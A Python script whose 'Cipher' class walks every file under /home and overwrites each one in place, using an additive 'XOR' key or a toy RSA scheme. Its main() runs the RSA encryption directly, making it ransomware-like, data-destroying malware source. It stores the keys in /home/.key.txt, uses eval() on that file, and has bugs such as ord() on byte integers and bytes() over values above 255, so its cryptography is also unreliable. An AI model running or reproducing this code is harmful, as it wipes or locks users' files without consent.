import os
import random 

class Cipher:
    class XOR:
        @staticmethod
        def encrypt():
            key = 'ThisIsA50CharacterLongKeyForEncryption1234567890!@'
            for root, dirs, files in os.walk('/home'):
                for file in files:
                    file_path = os.path.join(root, file)
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    
                    encrypted_data = bytes([(data[i] + ord(key[i % len(key)])) % 256 for i in range(len(data))])
                    
                    with open(file_path, 'wb') as f:
                        f.write(encrypted_data)
                    print(f"Encrypted: {file_path}")

            print("XOR Encryption completed.")

        @staticmethod
        def decrypt():
            key = 'ThisIsA50CharacterLongKeyForEncryption1234567890!@'
            for root, dirs, files in os.walk('/home'):
                for file in files:
                    file_path = os.path.join(root, file)
                    with open(file_path, 'rb') as f:
                        encrypted_data = f.read()
                    
                    decrypted_data = bytes([(encrypted_data[i] - ord(key[i % len(key)])) % 256 for i in range(len(encrypted_data))])
                    
                    with open(file_path, 'wb') as f:
                        f.write(decrypted_data)
                    print(f"Decrypted: {file_path}")

            print("XOR decryption completed.")


    class RSA:

        @staticmethod
        def generate_keypair(min_modulus, max_modulus):
            p = random.randint(min_modulus, max_modulus)
            q = random.randint(min_modulus, max_modulus)
            while not Cipher.RSA.is_prime(p):
                p = random.randint(min_modulus, max_modulus)
            while not Cipher.RSA.is_prime(q) or q == p:
                q = random.randint(min_modulus, max_modulus)
            n = p * q
            phi = (p - 1) * (q - 1)
            e = random.randint(2, phi - 1)
            while Cipher.RSA.gcd(e, phi) != 1:
                e = random.randint(2, phi - 1)
            d = Cipher.RSA.mod_inverse(e, phi)
            return ((e, n), (d, n))

        @staticmethod
        def encrypt_RSA(message, public_key):
            e, n = public_key   
            encrypted = [pow(ord(byte), e, n) for byte in message]
            return encrypted

        @staticmethod
        def decrypt_RSA(encrypted, private_key):
            d, n = private_key
            decrypted = ''.join([chr(pow(char, d, n)) for char in encrypted])
            return decrypted

        @staticmethod
        def gcd(a, b):
            while b != 0:
                a, b = b, a % b
            return a

        @staticmethod
        def mod_inverse(a, m):
            m0, x0, x1 = m, 0, 1
            while a > 1:
                q = a // m
                m, a = a % m, m
                x0, x1 = x1 - q * x0, x0
            return x1 + m0 if x1 < 0 else x1

        @staticmethod
        def is_prime(n):
            if n <= 1:
                return False
            if n <= 3:
                return True
            if n % 2 == 0 or n % 3 == 0:
                return False
            i = 5
            while i * i <= n:
                if n % i == 0 or n % (i + 2) == 0:
                    return False
                i += 6
            return True
        
        def encrypt():
            directory = "/home"
            public_key, private_key = Cipher.RSA.generate_keypair(1000, 10000)
            
            for root, dirs, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    encrypted_data = Cipher.RSA.encrypt_RSA(data, public_key)
                    with open(file_path, 'wb') as f:
                        f.write(bytes(encrypted_data))
            
            with open(os.path.join(directory, '.key.txt'), 'w') as key_file:
                key_file.write(f"Public Key: {public_key}\n")
                key_file.write(f"Private Key: {private_key}")

        def decrypt():
            directory = "/home"
            
            with open(os.path.join(directory, '.key.txt'), 'r') as key_file:
                keys = key_file.readlines()
                public_key = eval(keys[0].split(": ")[1])
                private_key = eval(keys[1].split(": ")[1])
            
            for root, dirs, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    decrypted_data = Cipher.RSA.decrypt_RSA(data, private_key)
                    with open(file_path, 'wb') as f:
                        f.write(bytes(decrypted_data, 'utf-8'))

def main():
    #Cipher.XOR.encrypt()
    #Cipher.XOR.decrypt()

    Cipher.RSA.encrypt()
    #Cipher.RSA.decrypt()

if __name__ == "__main__":
    main()
